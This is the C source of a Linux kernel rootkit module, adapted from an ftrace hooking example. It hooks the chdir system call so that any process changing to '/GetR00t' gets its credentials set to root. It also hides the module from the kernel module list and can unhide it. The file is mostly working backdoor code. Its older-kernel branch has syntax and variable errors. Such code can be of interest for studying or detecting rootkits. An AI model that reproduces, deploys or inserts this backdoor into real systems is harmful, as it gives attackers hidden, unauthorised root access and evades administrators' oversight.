/*
 * Hooking kernel functions using ftrace framework
 *
 * Copyright (c) 2018 ilammy
 */

#define pr_fmt(fmt) "ftrace_hook: " fmt

#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/unistd.h>

//#include <stdio.h>
//#include <stdlib.h>



//#define SHELL "/bin/sh"


MODULE_DESCRIPTION("Example module hooking mkdir() via ftrace");
MODULE_AUTHOR("ilammy <a.lozovsky@gmail.com> && Thomas Byrne");
MODULE_LICENSE("GPL");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = {
		.symbol_name = name
	};
	unsigned long retval;

	if (register_kprobe(&kp) < 0) return 0;
	retval = (unsigned long) kp.addr;
	unregister_kprobe(&kp);
	return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
	return kallsyms_lookup_name(name); // finds address of syscall i.e. sys_mkdir
}
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define ftrace_regs pt_regs



static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
{
	return fregs;
}
#endif

/*
 * There are two ways of preventing vicious recursive loops when hooking:
 * - detect recusion using function return address (USE_FENTRY_OFFSET = 0)
 * - avoid recusion by jumping over the ftrace call (USE_FENTRY_OFFSET = 1)
 */
#define USE_FENTRY_OFFSET 0

/**
 * struct ftrace_hook - describes a single hook to install
 *
 * @name:     name of the function to hook
 *
 * @function: pointer to the function to execute instead
 *
 * @original: pointer to the location where to save a pointer
 *            to the original function
 *
 * @address:  kernel address of the function entry
 *
 * @ops:      ftrace_ops state for this function hook
 *
 * The user should fill in only &name, &hook, &orig fields.
 * Other fields are considered implementation details.
 */
struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
	hook->address = lookup_name(hook->name);

	if (!hook->address) {
		pr_debug("unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

#if USE_FENTRY_OFFSET
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
	*((unsigned long*) hook->original) = hook->address;
#endif

	return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
		struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
	regs->ip = (unsigned long)hook->function;
#else
	if (!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
#endif
}

/**
 * fh_install_hooks() - register and enable a single hook
 * @hook: a hook to install
 *
 * Returns: zero on success, negative error code otherwise.
 */
int fh_install_hook(struct ftrace_hook *hook)
{
	int err;

	err = fh_resolve_hook_address(hook);
	if (err)
		return err;

	/*
	 * We're going to modify %rip register so we'll need IPMODIFY flag
	 * and SAVE_REGS as its prerequisite. ftrace's anti-recursion guard
	 * is useless if we change %rip so disable it with RECURSION.
	 * We'll perform our own checks for trace function reentry.
	 */
	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	                | FTRACE_OPS_FL_RECURSION
	                | FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) 
	{
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}

	return 0;
}

/**
 * fh_remove_hooks() - disable and unregister a single hook
 * @hook: a hook to remove
 */
void fh_remove_hook(struct ftrace_hook *hook)
{
	int err;

	err = unregister_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
	}
}

/**
 * fh_install_hooks() - register and enable multiple hooks
 * @hooks: array of hooks to install
 * @count: number of hooks to install
 *
 * If some hooks fail to install then all hooks will be removed.
 *
 * Returns: zero on success, negative error code otherwise.
 */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
	int err;
	size_t i;

	for (i = 0; i < count; i++) {
		err = fh_install_hook(&hooks[i]);
		if (err)
			goto error;
	}

	return 0;

error:
	while (i != 0) {
		fh_remove_hook(&hooks[--i]);
	}

	return err;
}

/**
 * fh_remove_hooks() - disable and unregister multiple hooks
 * @hooks: array of hooks to remove
 * @count: number of hooks to remove
 */
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
	size_t i;

	for (i = 0; i < count; i++)
		fh_remove_hook(&hooks[i]);
}

#ifndef CONFIG_X86_64
#error Currently only x86_64 architecture is supported
#endif

// Checking kenerl version (changes were made after 4.17.0 so need to be handled differently)
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
 * Tail call optimization can interfere with recursion detection based on
 * return address on the stack. Disable it to avoid machine hangups.
 */
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif



static short hide = 0;

// Start of hooks ---------------------------------------------------------

#ifdef PTREGS_SYSCALL_STUBS
//NEW WAY 

static asmlinkage long (*orig_chdir)(const struct pt_regs *);

asmlinkage int fh_sys_chdir(const struct pt_regs *regs)
{
    void set_root(void);
	void showrootkit(void);

	printk(KERN_INFO "Intercepting chdir call");
	
    
    char __user *filename = (char *)regs->di;
    char dir[255] = {0};

    long err = strncpy_from_user(dir, filename, 254);

	
    if (err > 0)
		{
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir);
		}
		


    if ( (strcmp(dir, "/GetR00t") == 0) && (hide == 0) )
        {
			//execl(SHELL, "sh", NULL);
            printk(KERN_INFO "rootkit: giving root...\n");
            set_root();
            return 0;
        }
	
	else if ( (strcmp(dir, "/GetR00t") == 0) && (hide == 1) )
        {
			printk(KERN_INFO "showing rootkit \n");
			showrootkit();
			hide = 0;
            return 0;
        }

	printk(KERN_INFO "ORIGINAL CALL");
	return orig_chdir(regs);
	
	
}
#else
static asmlinkage long sys_chdir(const char __user *filename);

asmlinkage int fh_sys_chdir(const char __user *filename)
{
    void set_root(void);
	void showrootkit(void);

	printk(KERN_INFO "Intercepting chdir call (old way)");

    char dir[255] = {0};

    long err = strncpy_from_user(dir, filename, 254);

    if (error > 0)
		{
        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir);
		}

	if ( (strcmp(dir, "/GetR00t") == 0) && (hide == 0) )
        {
            printk(KERN_INFO "rootkit: giving root...\n");
            set_root();
            return 0;
        }

	else ( (strcmp(dir, "/GetR00t") == 0) && (hide == 1) )
        {
			printk(KERN_INFO "showing rootkit \n");
			showrootkit();
			hide = 0;
            return 0;
        }
	
    
	return orig_chdir(filename);
		
}
#endif



void set_root(void)
      {
		   void hiderootkit(void);
		   
		   printk(KERN_INFO "set_root called");
		   
		   printk(KERN_INFO "The process is \"%s\" (pid %i)\n", current->comm, current->pid);

		   struct cred *root;
           root = prepare_creds();
           
           if (root == NULL)
           {
               printk(KERN_INFO "root is NULL");
			   return;
           }

			printk(KERN_INFO "Setting privileges... ");
           /* Run through and set all the various *id's of the current user and set them all to 0 (root) */
            root->uid.val = root->gid.val = 0;
            root->euid.val = root->egid.val = 0;
            root->suid.val = root->sgid.val = 0;
            root->fsuid.val = root->fsgid.val = 0;


           /* Set the credentials to root */
		   printk(KERN_INFO "Commiting creds");
           commit_creds(root);
		   
		   
		   /* Hide rootkit once root has been given */
		   printk(KERN_INFO "Hiding rootkit \n");
		   hiderootkit();
		   hide = 1;
      }




static struct list_head *prev_module;
void hiderootkit(void)
	{
	prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

	}


void showrootkit(void)
	{
	list_add(&THIS_MODULE->list, prev_module);
	}



/*
 * x86_64 kernels have a special naming convention for syscall entry points in newer kernels.
 * That's what you end up with if an architecture has 3 (three) ABIs for system calls.
 */
#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

#define HOOK(_name, _function, _original)	\
	{					\
		.name = SYSCALL_NAME(_name),	\
		.function = (_function),	\
		.original = (_original),	\
	}

static struct ftrace_hook demo_hooks[] = {
	HOOK("sys_chdir",  fh_sys_chdir,  &orig_chdir)
};

static int rootkit_init(void)
{
	int err;

	err = fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
	if (err)
		return err;

	printk(KERN_INFO "module loaded\n");

	return 0;
}


static void rootkit_exit(void)
{
	fh_remove_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));

	printk(KERN_INFO "module unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
 
